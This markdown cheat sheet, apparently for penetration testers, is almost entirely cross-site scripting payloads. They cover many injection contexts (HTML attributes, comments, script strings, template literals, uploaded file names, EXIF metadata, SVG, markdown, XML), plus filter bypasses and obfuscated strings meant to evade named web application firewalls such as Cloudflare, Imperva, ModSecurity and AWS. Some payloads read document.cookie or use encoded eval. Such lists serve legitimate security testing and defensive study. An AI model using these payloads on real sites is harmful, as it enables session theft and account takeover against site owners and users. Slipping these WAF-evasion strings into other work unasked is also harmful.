# XSS Cheat Sheet (Basic)

## Introduction
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS

    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
  
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS

    A type of XSS that has payloads found in the DOM rather than within the HTML code.

## Where to find
This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.

## How to exploit
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
    
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside ```<script>``` tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

## **XSS Cheat Sheet (Advanced)**
7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* If we input payload '-alert(1)-' it will be like this
```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```
The quotes are escaped by a backslash so we need to bypass them

* After input the payload
```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```

* Example source code
```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```

* Example source code
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* After input the payload
```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> Payload number 2 uses when quote escaped by backslash

11. Use when input lands inside backticks delimited strings
```html
${alert(1)}
```

* Example source code
```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

* After input the payload
```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

12. Uses when there is multiple reflections on same page. (Double Reflection)
```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
...
'onload=alert(1)><svg/1='
</body>
</html>
```

13. Uses when there is multiple reflections on same page. (Triple Reflection)
```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
```

14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
```
"><svg onload=alert(1)>.jpeg
```

15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
```
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
```

16. XSS with SVG file (File Upload)
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

17. XSS via markdown
```
[Click Me](javascript:alert('1'))
```

18. XSS in XML page
```
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```
> Add a "-->" to payload if input lands in a comment section

> Add a "]]>" if input lands in a CDATA section

## **XSS Cheat Sheet (Bypass)**
19. Mixed Case
```html
<Script>alert(document.cookie)</Script> 
```

20. Unclosed Tags
```html
<svg onload="alert(1)"
```

21. Uppercase Payloads
```html
<SVG ONLOAD=ALERT(1)>
```

22. Encoded XSS
```html
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 

(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 

(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```

23. JS Lowercased Input
```html
<SCRİPT>alert(1)</SCRİPT>
```

24. PHP Email Validation Bypass
```html
<svg/onload=alert(1)>"@gmail.com
```

25. PHP URL Validation Bypass
```html
javascript://%250Aalert(1)
```

26. Inside Comments Bypass
```html
<!--><svg onload=alert(1)-->
```

## Bypass WAF
1. Cloudflare
```
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg/onload={alert`1`}>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=alert%26%230000000040"1")>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

<--`<img/src=` onerror=confirm``> --!>

<img src=x onerror="a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">

<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x

'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

'"><img/src/onerror=.1|alert``>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
```

2. Cloudfront
```
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>

"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
```

3. Cloudbric
```
<a69/onclick=[1].findIndex(alert)>pew
```

4. Comodo WAF
```
<input/oninput='new Function`confir\u006d\`0\``'>

<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
```

5. ModSecurity
```
<a href="jav%0Dascript&colon;alert(1)">
```

6. Imperva
```
<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>

<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

<a69/onclick=write&lpar;&rpar;>pew

<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>

<svg onload\r\n=$.globalEval("al"+"ert()");>

<svg/onload=self[`aler`%2b`t`]`1`>

%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E

<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>

<img/src=q onerror='new Function`al\ert\`1\``'>

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

7. AWS
```
<script>eval(atob(decodeURIComponent(confirm`1`)))</script>
```

If you want to see the other payload for other WAF, check this [link](https://github.com/0xInfection/Awesome-WAF)

## References
- [Brute Logic](https://brutelogic.com.br/)
- [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
- Some random twitter posts